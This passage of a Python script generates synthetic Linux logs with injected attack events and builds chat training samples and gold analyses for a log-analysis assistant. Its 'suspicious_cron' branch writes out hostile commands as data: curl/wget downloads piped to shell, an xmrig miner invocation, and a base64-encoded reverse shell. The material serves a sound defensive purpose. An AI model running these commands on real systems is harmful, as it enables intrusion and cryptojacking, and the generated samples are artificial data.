        for _ in range(n):
            t = self.rt()
            svc = r.choice(SERVICES)
            m = r.choice([
                ("systemd", f"Started {svc.replace('.service', '')}.service - {svc.split('.')[0].title()} daemon.", 1),
                ("systemd", "Starting logrotate.service - Rotate log files...", 1),
                ("systemd", "logrotate.service: Deactivated successfully.", 1),
                ("CRON", f"({r.choice(['root', 'www-data'] + self.users[:1])}) CMD ({r.choice(BENIGN_CRON)})", self.npid()),
                ("systemd-timesyncd", f"Initial clock synchronization to {t:%a %Y-%m-%d %H:%M:%S} UTC.", r.randint(400, 900)),
                ("systemd-resolved", "Clock change detected. Flushing caches.", r.randint(400, 900)),
                ("rsyslogd", "[origin software=\"rsyslogd\" swVersion=\"8.2312.0\" x-pid=\"812\" x-info=\"https://www.rsyslog.com\"] rsyslogd was HUPed", None),
                ("dockerd", f"time=\"{t:%Y-%m-%dT%H:%M:%S}.{r.randint(100000000, 999999999)}Z\" level=info msg=\"ignoring event\" container={r.getrandbits(256):064x} module=libcontainerd namespace=moby topic=/tasks/delete type=\"*events.TaskDelete\"", r.randint(900, 3000)),
                ("snapd", "storehelpers.go:769: cannot refresh: snap has no updates available: \"core22\", \"lxd\"", r.randint(900, 3000)),
                ("systemd", "Finished apt-daily.service - Daily apt download activities.", 1)])
            self.add(self.syslog_line(t, m[0], m[1], "syslog", pid=m[2]))

    def syslog_attack(self, kind, user=None):
        r = self.r
        if kind == "service_failure":
            svc = r.choice(SERVICES)
            why = r.choice(["exit-code", "signal", "timeout", "start-limit-hit", "oom-kill", "core-dump"])
            f = Finding(kind, "medium" if svc not in ("ssh.service", "fail2ban.service") else "high", "syslog", "observed", extra={"svc": svc, "why": why})
            t = self.rt()
            msgs = [f"{svc}: Main process exited, code={'exited' if why == 'exit-code' else 'killed' if why in ('signal', 'oom-kill') else 'dumped'}, status={'1/FAILURE' if why == 'exit-code' else '9/KILL' if why in ('signal', 'oom-kill') else '11/SEGV'}",
                    f"{svc}: Failed with result '{why}'.", f"Failed to start {svc} - {svc.split('.')[0]}."]
            if r.random() < 0.5:
                msgs.append(f"{svc}: Scheduled restart job, restart counter is at {r.randint(1, 5)}.")
            for i, m in enumerate(msgs):
                self.add(self.syslog_line(t + dt.timedelta(milliseconds=i * 20), "systemd", m, "syslog", f, pid=1, svc=svc), nc=(i != 1))
            self.findings.append(f)
        elif kind == "suspicious_cron":
            u = user or r.choice(["root", "www-data"] + self.users[:1])
            cmd = r.choice([f"curl -fsSL http://{r.pub_ip()}/cr.sh | sh", f"wget -q -O - http://{r.pub_ip()}:8080/x | bash", "/tmp/.ICE-unix/.x/kdevtmpfsi",
                            f"(curl -s http://{r.pub_ip()}/b.sh||wget -q -O- http://{r.pub_ip()}/b.sh)|bash", "/var/tmp/.font/xmrig -o pool.minexmr.com:443 --donate-level 1",
                            "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ== | base64 -d | bash"])
            f = Finding(kind, "critical", "syslog", "successful", [], [u], extra={"cmd": cmd})
            for t in self.burst(r.randint(1, 3), 3600):
                self.add(self.syslog_line(t, "CRON", f"({u}) CMD ({cmd})", "syslog", f, pid=self.npid(), user=u))
            self.findings.append(f)
        elif kind == "disk_error":
            dev = r.choice(["sda", "sdb", "sdc"])
            f = Finding("disk_error", "high", "syslog", "observed", extra={"dev": "/dev/" + dev})
            k = r.randint(1, 8)
            for t in self.burst(r.randint(1, 3), 3600):
                self.add(self.syslog_line(t, "smartd", r.choice([f"Device: /dev/{dev} [SAT], {k} Currently unreadable (pending) sectors",
                                                                f"Device: /dev/{dev} [SAT], {k} Offline uncorrectable sectors",
                                                                f"Device: /dev/{dev} [SAT], SMART Prefailure Attribute: 5 Reallocated_Sector_Ct changed from 100 to {r.randint(80, 99)}",
                                                                f"Device: /dev/{dev} [SAT], FAILED SMART self-check. BACK UP DATA NOW!"]), "syslog", f, pid=r.randint(500, 2000)))
            if any("FAILED SMART" in l.text for l in self.lines if l.fid is f):
                f.severity = "critical"
            self.findings.append(f)
        elif kind == "fail2ban_ban":
            ips = [self.new_ip() for _ in range(r.randint(1, 4))]
            jail = r.choice(["sshd", "sshd", "nginx-http-auth", "recidive", "nginx-botsearch"])
            f = Finding(kind, "info", "fail2ban", "blocked", ips, extra={"jail": jail})
            for ip in ips:
                t = self.rt()
                for i, (lvl, m) in enumerate([("INFO", f"[{jail}] Found {ip} - {ts_fmt(t, 'f2b')[:19]}"), ("NOTICE", f"[{jail}] Ban {ip}")]):
                    tt = t + dt.timedelta(seconds=i)
                    ts = ts_fmt(tt, "f2b")
                    comp = "fail2ban.filter" if lvl == "INFO" else "fail2ban.actions"
                    self.add(Line(tt, f"{ts} {comp:<17}[{r.randint(700, 2000)}]: {lvl:<8} {m}", "fail2ban", ts, f, ip=ip), nc=(lvl == "INFO"))
            self.findings.append(f)


SRC_FILES = {"nginx_access": "/var/log/nginx/access.log", "apache_access": "/var/log/apache2/access.log", "nginx_error": "/var/log/nginx/error.log",
             "apache_error": "/var/log/apache2/error.log", "auth": "/var/log/auth.log", "ufw": "/var/log/ufw.log", "dmesg": "dmesg",
             "syslog": "/var/log/syslog", "fail2ban": "/var/log/fail2ban.log"}
SRC_LABEL = {"nginx_access": "nginx_access", "apache_access": "apache_access", "nginx_error": "nginx_error", "apache_error": "apache_error",
             "auth": "auth", "ufw": "ufw", "dmesg": "kernel", "syslog": "syslog", "fail2ban": "fail2ban"}

WEB_ATTACKS = ["sql_injection", "xss", "path_traversal", "command_injection", "log4shell", "shellshock", "vulnerability_scanner",
               "sensitive_file_probe", "cms_admin_probe", "web_brute_force", "webshell_access", "http_flood", "server_errors"]
AUTH_ATTACKS = ["ssh_scan", "ssh_brute_force", "ssh_user_enumeration", "distributed_ssh_brute_force", "compromised_account", "root_login",
                "privilege_escalation_attempt", "sudo_auth_failure", "suspicious_sudo_command", "account_created", "unusual_login"]
UFW_ATTACKS = ["port_scan", "repeated_blocked_connections", "firewall_disabled"]
DMESG_ATTACKS = ["oom_kill", "segfault", "disk_error", "hardware_error", "kernel_oops", "syn_flood", "conntrack_full", "unsigned_module",
                 "apparmor_denied", "usb_device"]
SYSLOG_ATTACKS = ["service_failure", "suspicious_cron", "fail2ban_ban", "disk_error"]


def build(rng: R, split):
    s = Scenario(rng, split)
    s.vhost = rng.random() < 0.15
    s.webfmt = rng.choices(["combined", "custom_rt", "combined_xff", "json"], [70, 10, 10, 10])[0]
    r = rng
    mode = r.choices(["web", "weberr", "auth", "ufw", "dmesg", "syslog", "mixed_sys", "mixed_files", "chain_web", "chain_ssh"], [24, 6, 20, 9, 11, 7, 10, 6, 4, 5])[0]
    n_att = r.choices([0, 1, 2, 3], [22, 42, 26, 10])[0]
    if mode == "chain_web":
        src = r.choice(["nginx_access", "nginx_access", "apache_access"])
        s.web_noise(src, r.randint(4, 18))
        ip = s.new_ip()
        steps = r.choice([["vulnerability_scanner", "sql_injection"], ["sensitive_file_probe", "sql_injection"], ["cms_admin_probe", "web_brute_force"],
                          ["vulnerability_scanner", "path_traversal"], ["sensitive_file_probe", "command_injection", "webshell_access"],
                          ["cms_admin_probe", "webshell_access"], ["sql_injection", "xss"]])
        for k in steps:
            s.web_attack(src, k, ip=ip)
        return s, [src], "web"
    if mode == "chain_ssh":
        s.auth_noise(r.randint(3, 10))
        if r.random() < 0.5:
            s.syslog_noise(r.randint(2, 6))
        ip = s.new_ip()
        u = r.choice(s.users + ["postgres", "git", "deploy"])
        if r.random() < 0.4:
            s.ufw_noise(r.randint(1, 4)); s.ufw_attack("port_scan", ip=ip)
        if r.random() < 0.75:
            f = s.auth_attack("compromised_account", ip=ip, user=u)
            s.floor = max(l.t for l in s.lines if l.fid is s.findings[-1])
            for k in r.sample(["privilege_escalation_attempt", "suspicious_sudo_command", "suspicious_cron", "account_created"], r.randint(1, 2)):
                if k == "suspicious_cron":
                    s.syslog_attack(k, user=u)
                elif k == "account_created":
                    s.auth_attack(k)
                else:
                    s.auth_attack(k, user=u)
            s.floor = None
        else:
            s.auth_attack("ssh_brute_force", ip=ip)
        return s, ["journal"], "mixed_sys"
    if mode == "web":
        src = r.choice(["nginx_access", "nginx_access", "apache_access"])
        s.web_noise(src, r.randint(4, 26))
        for k in r.sample(WEB_ATTACKS, n_att):
            s.web_attack(src, k)
        srcs = [src]
    elif mode == "weberr":
        if r.random() < 0.6:
            s.nginx_error_lines(r.randint(3, 12), r.sample(["server_errors", "path_traversal", "sensitive_file_probe", "web_brute_force", "http_flood"], min(n_att, 2)))
            srcs = ["nginx_error"]
        else:
            s.apache_error_lines(r.randint(3, 12), r.sample(["path_traversal", "sql_injection", "server_errors", "command_injection"], min(n_att, 2)))
            srcs = ["apache_error"]
    elif mode == "auth":
        s.auth_noise(r.randint(4, 22))
        for _ in range(r.choice([0, 0, 1, 1, 2])):
            s.auth_hard_negative()
        for k in r.sample(AUTH_ATTACKS, n_att):
            s.auth_attack(k)
        srcs = ["auth"]
    elif mode == "ufw":
        s.ufw_noise(r.randint(3, 14))
        for k in r.sample(UFW_ATTACKS, min(n_att, 2)):
            s.ufw_attack(k)
        srcs = ["ufw"]
    elif mode == "dmesg":
        s.dmesg_noise(r.randint(5, 22))
        for k in r.sample(DMESG_ATTACKS, n_att):
            s.dmesg_attack(k)
        srcs = ["dmesg"]
    elif mode == "syslog":
        s.syslog_noise(r.randint(5, 20))
        if r.random() < 0.5:
            s.app_noise(r.randint(2, 10))
        for k in r.sample(SYSLOG_ATTACKS, min(n_att, 2)):
            s.syslog_attack(k)
        srcs = ["syslog"] + (["fail2ban"] if any(f.category == "fail2ban_ban" for f in s.findings) else [])
    elif mode == "mixed_sys":
        # journalctl-like interleaved stream: auth + ufw + syslog (+ kernel without uptime prefix)
        s.auth_noise(r.randint(3, 10)); s.syslog_noise(r.randint(2, 8)); s.ufw_noise(r.randint(1, 5))
        if r.random() < 0.4:
            s.app_noise(r.randint(1, 6))
        if r.random() < 0.4:
            s.auth_hard_negative()
        pool = [("auth", a) for a in AUTH_ATTACKS] + [("ufw", a) for a in UFW_ATTACKS] + [("syslog", a) for a in SYSLOG_ATTACKS if a != "fail2ban_ban"]
        for src, k in r.sample(pool, max(1, n_att)):
            {"auth": s.auth_attack, "ufw": s.ufw_attack, "syslog": s.syslog_attack}[src](k)
        srcs = ["journal"]
    else:  # mixed_files: tail -n of two files with headers
        a, b = r.sample(["web", "auth", "ufw", "dmesg", "syslog"], 2)
        srcs = []
        for part in (a, b):
            if part == "web":
                src = r.choice(["nginx_access", "apache_access"]); s.web_noise(src, r.randint(3, 12))
                if r.random() < 0.7: s.web_attack(src, r.choice(WEB_ATTACKS))
            elif part == "auth":
                src = "auth"; s.auth_noise(r.randint(3, 10))
                if r.random() < 0.7: s.auth_attack(r.choice(AUTH_ATTACKS))
            elif part == "ufw":
                src = "ufw"; s.ufw_noise(r.randint(2, 8))
                if r.random() < 0.7: s.ufw_attack(r.choice(UFW_ATTACKS[:2]))
            elif part == "dmesg":
                src = "dmesg"; s.dmesg_noise(r.randint(3, 10))
                if r.random() < 0.7: s.dmesg_attack(r.choice(DMESG_ATTACKS))
            else:
                src = "syslog"; s.syslog_noise(r.randint(3, 10))
                if r.random() < 0.7: s.syslog_attack(r.choice(SYSLOG_ATTACKS[:2]))
            srcs.append(src)
        if any(l.src == "fail2ban" for l in s.lines):
            srcs.append("fail2ban")
    return s, srcs, mode


def render(s: Scenario, srcs, mode):
    """Return text and ordered line list."""
    r = s.r
    if mode == "mixed_sys":
        lines = sorted(s.lines, key=lambda l: l.t)
        return "\n".join(l.text for l in lines), lines
    if len(srcs) == 1:
        lines = sorted(s.lines, key=lambda l: l.t)
        return "\n".join(l.text for l in lines), lines
    out, ordered = [], []
    style = r.choice(["tail", "dash", "hash"])
    for src in srcs:
        part = sorted([l for l in s.lines if l.src == src or (src == "auth" and l.src == "auth")], key=lambda l: l.t)
        if not part:
            continue
        name = SRC_FILES.get(src, src)
        hdr = {"tail": f"==> {name} <==", "dash": f"--- {name} ---", "hash": f"# {name}"}[style]
        if out:
            out.append("")
        out.append(hdr)
        out.extend(l.text for l in part)
        ordered.extend(part)
    return "\n".join(out), ordered


# --------------------------------------------------------------------------- targets
PROMPTS_EN = ["Analyze these logs and report any security issues.", "Analyze the following server logs.", "Here are some logs from my server. Anything suspicious?",
              "Review these logs for vulnerabilities, attacks or errors.", "Act as a SOC analyst: triage these logs.", "What happened here?",
              "Check these logs and return your analysis as JSON.", "Is my server under attack? Logs below.", "Audit this log excerpt.",
              "Find security problems in these logs.", "Please inspect these Linux logs and summarize the incidents.", ""]
PROMPTS_FR = ["Analyse ces logs et signale les problèmes de sécurité.", "Analyse les logs suivants de mon serveur.", "Voici des logs de mon serveur. Quelque chose de suspect ?",
              "Vérifie ces logs : attaques, vulnérabilités ou erreurs ?", "Fais le tri de ces logs comme un analyste SOC.", "Que s'est-il passé ici ?",
              "Analyse ces journaux et réponds en JSON.", "Mon serveur est-il attaqué ? Logs ci-dessous.", "Audite cet extrait de logs."]
SYSTEM = ["You are LogSentinel, a Linux log analysis assistant. You read server logs (nginx, apache, auth/sshd, sudo, ufw, dmesg, syslog, fail2ban) and report security findings and operational problems accurately. Never invent events that are not in the logs.",
          "You are a security log analyzer.", "Tu es un assistant d'analyse de logs Linux.", None, None]


def analysis_target(s: Scenario, srcs, ordered, lang):
    fs = [f for f in s.findings if any(l.fid is f for l in ordered)]
    for f in fs:
        f.lines = [l for l in ordered if l.fid is f]
    fs.sort(key=lambda f: (-SEV_RANK[f.severity], f.lines[0].t))
    out_f = []
    for f in fs:
        ev = f.lines[0] if f.category not in ("compromised_account",) else [l for l in f.lines if l.meta.get("event") == "accepted"][0]
        if f.category == "sensitive_file_probe" and f.extra.get("exposed"):
            ev = [l for l in f.lines if l.meta.get("status") == 200][0]
        if f.category in ("sql_injection", "path_traversal", "command_injection", "xss") and f.status == "possibly_successful":
            ev = [l for l in f.lines if l.meta.get("status") == 200][0]
        if f.category == "oom_kill":
            ev = [l for l in f.lines if "Killed process" in l.text][0]
        d = OrderedDict()
        d["category"] = f.category
        d["severity"] = f.severity
        d["status"] = f.status
        d["source"] = SRC_LABEL.get(f.source, f.source)
        if f.ips:
            d["ips"] = f.ips
        if f.users:
            d["users"] = f.users
        d["count"] = f.count
        d["first_seen"] = f.lines[0].ts
        d["last_seen"] = f.lines[-1].ts
        d["evidence"] = ev.text
        d["description"] = describe(f, lang)
        out_f.append(d)
    risk = max([f.severity for f in fs], key=lambda x: SEV_RANK[x]) if fs else "none"
    if risk == "info":
        risk = "low"
    srcset = []
    for l in ordered:
        lab = SRC_LABEL.get(l.src, l.src)
        if lab not in srcset:
            srcset.append(lab)
    # summary
    n = len(ordered)
    if not fs:
        summ = (f"{n} log lines reviewed; no security issue or error found. Activity looks normal." if lang == "en"
                else f"{n} lignes de logs analysées ; aucun problème de sécurité ni erreur détecté. L'activité semble normale.")
    else:
        top = fs[0]
        cats = ", ".join(dict.fromkeys(f.category.replace("_", " ") for f in fs))
        if lang == "en":
            summ = f"{n} log lines reviewed, {len(fs)} finding(s): {cats}. Highest risk: {risk}. Most important: {describe(top, 'en')}"
        else:
            summ = f"{n} lignes de logs analysées, {len(fs)} constat(s) : {cats}. Risque maximal : {risk}. Le plus important : {describe(top, 'fr')}"
    recs = []
    for f in fs:
        rec = RECS[f.category][1 if lang == "fr" else 0].format(ip=", ".join(f.ips[:3]) if f.ips else "the source")
        if rec not in recs:
            recs.append(rec)
    out = OrderedDict()
    out["log_sources"] = srcset
    out["time_range"] = {"start": ordered[0].ts, "end": ordered[-1].ts} if s.dmesg_kind != "x" else None
    out["risk_level"] = risk
    out["findings"] = out_f
    out["summary"] = summ
    out["recommendations"] = recs
    return out


def qa_targets(s: Scenario, ordered, lang, analysis):
    """Return list of (question, answer) pairs computable from metadata."""
    r = s.r
    fr = lang == "fr"
    qs = []
    web = [l for l in ordered if l.src in ("nginx_access", "apache_access")]
    auth = [l for l in ordered if l.src == "auth"]
    ufw = [l for l in ordered if l.src == "ufw" and "action" in l.meta]
    allips = list(dict.fromkeys(ip for l in ordered for ip in IP_RE.findall(l.text)))
    if web:
        c = Counter(l.meta["ip"] for l in web)
        top = c.most_common()
        if len(top) >= 3 and top[0][1] > top[1][1] > top[2][1] and (len(top) < 4 or top[2][1] > top[3][1]):
            q = r.choice(["Which IP addresses sent the most requests? Give the top 3 with counts.", "Top 3 client IPs by number of requests?"]) if not fr else "Quelles IP ont envoyé le plus de requêtes ? Donne le top 3 avec le nombre."
            qs.append((q, "\n".join(f"{i + 1}. {ip} — {n} " + ("requêtes" if fr else "requests") for i, (ip, n) in enumerate(top[:3]))))
        sc = Counter(l.meta["status"] for l in web)
        code = r.choice(list(sc))
        q = (f"How many requests returned HTTP {code}?" if not fr else f"Combien de requêtes ont renvoyé le code HTTP {code} ?")
        qs.append((q, str(sc[code])))
        q = "Give the count of each HTTP status code as JSON." if not fr else "Donne le nombre de réponses par code HTTP en JSON."
        qs.append((q, json.dumps({str(k): v for k, v in sorted(sc.items())})))
        nf = list(dict.fromkeys(l.meta["path"] for l in web if l.meta["status"] == 404))
        if nf and len(nf) <= 20:
            q = "List the distinct paths that returned 404." if not fr else "Liste les chemins distincts qui ont renvoyé 404."
            qs.append((q, "\n".join(f"- {p}" for p in nf)))
        bad = [l for l in web if l.meta["status"] >= 500]
        q = "Were there any server errors (5xx)? List them as JSON with time, ip, path and status." if not fr else "Y a-t-il des erreurs serveur (5xx) ? Liste-les en JSON avec time, ip, path et status."
        if len(bad) <= 15:
            qs.append((q, json.dumps([{"time": l.ts, "ip": l.meta["ip"], "path": l.meta["path"], "status": l.meta["status"]} for l in bad], ensure_ascii=False) if bad else "[]"))
        ip = r.choice(list(c))
        q = f"What did {ip} request? List method, path and status." if not fr else f"Qu'a demandé {ip} ? Liste méthode, chemin et code."
        reqs = [l for l in web if l.meta["ip"] == ip]
        if len(reqs) <= 15:
            qs.append((q, "\n".join(f"- {l.meta['method']} {l.meta['path']} → {l.meta['status']}" for l in reqs)))
        uas = list(dict.fromkeys(l.meta["ua"] for l in web if any(k in l.meta["ua"] for k in ("sqlmap", "Nikto", "Nuclei", "zgrab", "masscan", "Nmap", "WPScan", "gobuster", "DirBuster", "Fuzz Faster", "acunetix"))))
        q = "Are there requests from known scanning tools (user-agents)? Which IPs?" if not fr else "Y a-t-il des requêtes d'outils de scan connus (user-agent) ? Quelles IP ?"
        if uas:
            ips = list(dict.fromkeys(l.meta["ip"] for l in web if l.meta["ua"] in uas))
            qs.append((q, ("Oui" if fr else "Yes") + ": " + ", ".join(ips) + "\n" + "\n".join(f"- {u}" for u in uas)))
        else:
            qs.append((q, "Non, aucun user-agent d'outil de scan connu." if fr else "No, no known scanner user-agent appears."))
    if auth:
        failed = [l for l in auth if l.meta.get("event") == "failed"]
        fu = list(dict.fromkeys(l.meta["user"] for l in failed))
        q = "Which usernames had failed SSH password attempts?" if not fr else "Quels utilisateurs ont eu des échecs de mot de passe SSH ?"
        qs.append((q, ", ".join(fu) if fu else ("Aucun." if fr else "None.")))
        acc = [l for l in auth if l.meta.get("event") == "accepted"]
        q = "List all successful SSH logins (user, source IP, time)." if not fr else "Liste toutes les connexions SSH réussies (utilisateur, IP source, heure)."
        qs.append((q, "\n".join(f"- {l.meta['user']} from {l.meta['ip']} at {l.ts}" if not fr else f"- {l.meta['user']} depuis {l.meta['ip']} à {l.ts}" for l in acc) if acc else ("Aucune." if fr else "None.")))
        if failed and len(failed) <= 20:
            q = "Extract every failed login as JSON objects with time, user and ip." if not fr else "Extrais chaque échec de connexion en JSON avec time, user et ip."
            qs.append((q, json.dumps([{"time": l.ts, "user": l.meta["user"], "ip": l.meta["ip"]} for l in failed])))
        fc = Counter(l.meta["ip"] for l in failed)
        if fc:
            q = "Which IPs failed SSH authentication, and how many times each?" if not fr else "Quelles IP ont échoué à l'authentification SSH, et combien de fois chacune ?"
            qs.append((q, "\n".join(f"- {ip}: {n}" for ip, n in sorted(fc.items(), key=lambda x: (-x[1], allips.index(x[0]) if x[0] in allips else 0)))))
        sud = [l for l in auth if l.meta.get("event") in ("sudo", "sudo_denied")]
        q = "Which commands were run with sudo, and by whom?" if not fr else "Quelles commandes ont été lancées avec sudo, et par qui ?"
        qs.append((q, "\n".join(f"- {l.meta['user']}: {l.meta['cmd']}" + (" (DENIED: not in sudoers)" if l.meta['event'] == 'sudo_denied' and not fr else " (REFUSÉ : absent de sudoers)" if l.meta['event'] == 'sudo_denied' else "") for l in sud) if sud else ("Aucune commande sudo." if fr else "No sudo commands.")))
        comp = [f for f in analysis["findings"] if f["category"] == "compromised_account"]
        q = "Did any login succeed after failed attempts from the same IP?" if not fr else "Une connexion a-t-elle réussi après des échecs depuis la même IP ?"
        if comp:
            a = "; ".join(f"{('Oui' if fr else 'Yes')}: {c['users'][0]} from {c['ips'][0]} ({c['count']} failures, then success at {c['last_seen']})" for c in comp) if not fr else \
                "; ".join(f"Oui : {c['users'][0]} depuis {c['ips'][0]} ({c['count']} échecs, puis succès à {c['last_seen']})" for c in comp)
        else:
            a = "Non." if fr else "No."
        qs.append((q, a))
    if ufw:
        blk = [l for l in ufw if l.meta["action"] == "BLOCK"]
        if blk:
            ip = r.choice([l.meta["ip"] for l in blk])
            ports = sorted(set(l.meta["port"] for l in blk if l.meta["ip"] == ip))
            q = f"Which destination ports did {ip} try that were blocked?" if not fr else f"Quels ports de destination {ip} a-t-il tentés (bloqués) ?"
            qs.append((q, ", ".join(map(str, ports))))
            bc = Counter(l.meta["ip"] for l in blk)
            q = "How many packets did UFW block in total, from how many distinct IPs?" if not fr else "Combien de paquets UFW a-t-il bloqués au total, depuis combien d'IP distinctes ?"
            qs.append((q, f"{len(blk)} blocked packets from {len(bc)} distinct IPs." if not fr else f"{len(blk)} paquets bloqués depuis {len(bc)} IP distinctes."))
            pc = Counter(l.meta["port"] for l in blk)
            top = pc.most_common(2)
            if len(top) == 1 or top[0][1] > top[1][1]:
                q = "Which destination port was blocked most often?" if not fr else "Quel port de destination a été le plus bloqué ?"
                qs.append((q, f"{top[0][0]} ({top[0][1]})"))
    if allips and len(allips) <= 25:
        q = "Extract all unique IP addresses, in order of first appearance." if not fr else "Extrais toutes les adresses IP uniques, dans l'ordre d'apparition."
        qs.append((q, "\n".join(allips)))
    q = "What time range do these logs cover?" if not fr else "Quelle période couvrent ces logs ?"
    qs.append((q, f"From {ordered[0].ts} to {ordered[-1].ts}." if not fr else f"Du {ordered[0].ts} au {ordered[-1].ts}."))
    # yes/no per category
    cats = [f["category"] for f in analysis["findings"]]
    probe = r.choice(cats) if cats and r.random() < 0.6 else r.choice(WEB_ATTACKS + AUTH_ATTACKS + DMESG_ATTACKS + UFW_ATTACKS + SYSLOG_ATTACKS)
    name = probe.replace("_", " ")
    q = f"Is there any sign of {name} in these logs?" if not fr else f"Y a-t-il des signes de « {name} » dans ces logs ?"
    hits = [f for f in analysis["findings"] if f["category"] == probe]
    if hits:
        a = ("Oui. " if fr else "Yes. ") + " ".join(h["description"] for h in hits) + "\n" + ("Exemple : " if fr else "Example: ") + hits[0]["evidence"]
    else:
        a = "Non." if fr else "No."
    qs.append((q, a))
    q = "What is the most serious problem in these logs? One sentence." if not fr else "Quel est le problème le plus grave dans ces logs ? Une phrase."
    if analysis["findings"]:
        h = analysis["findings"][0]
        qs.append((q, f"[{h['severity'].upper()}] {h['description']}"))
    else:
        qs.append((q, "Aucun problème : l'activité semble normale." if fr else "Nothing serious: activity looks normal."))
    k = [l for l in ordered if l.src == "dmesg" and l.fid is not None]
    if any(l.src == "dmesg" for l in ordered):
        q = "List the kernel error/warning lines (ignore normal boot messages)." if not fr else "Liste les lignes d'erreur/avertissement du noyau (ignore les messages de boot normaux)."
        if len(k) <= 15:
            qs.append((q, "\n".join(l.text for l in k) if k else ("Aucune : uniquement des messages normaux." if fr else "None: only normal messages.")))
    return qs


def make_sample(rng: R, split):
    s, srcs, mode = build(rng, split)
    text, ordered = render(s, srcs, mode)
    lang = rng.choice(LANG_CHOICES)
    analysis = analysis_target(s, srcs, ordered, lang)
    sysmsg = rng.choice(SYSTEM)
    if rng.random() < 0.62:
        prompt = rng.choice(PROMPTS_FR if lang == "fr" else PROMPTS_EN)
        wrap = rng.choice(["{p}\n\n{logs}", "{p}\n\n```\n{logs}\n```", "{p}\n{logs}", "{logs}\n\n{p}", "{p}\n\n<logs>\n{logs}\n</logs>"])
        user = wrap.format(p=prompt, logs=text).strip()
        answer = json.dumps(analysis, ensure_ascii=False, indent=rng.choice([None, 2]) if False else 2)
        task = "analysis"
    else:
        qa = qa_targets(s, ordered, lang, analysis)
        q, answer = rng.choice(qa)
        wrap = rng.choice(["{logs}\n\n{q}", "```\n{logs}\n```\n\n{q}", "{q}\n\n{logs}", "{q}\n```\n{logs}\n```"])
        user = wrap.format(q=q, logs=text)
        task = "qa"
    msgs = ([{"role": "system", "content": sysmsg}] if sysmsg else []) + [{"role": "user", "content": user}, {"role": "assistant", "content": answer}]
    return {"messages": msgs, "task": task, "lang": lang, "mode": mode, "n_lines": len(ordered),
            "gold": analysis if task == "analysis" else None}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=1000)
    ap.add_argument("--seed", type=int, default=0)
    ap.add_argument("--out", required=True)
    ap.add_argument("--split", default="train")
    a = ap.parse_args()
    rng = R(a.seed)
    with open(a.out, "w") as fh:
        for i in range(a.n):
            fh.write(json.dumps(make_sample(rng, a.split), ensure_ascii=False) + "\n")


if __name__ == "__main__":
    main()
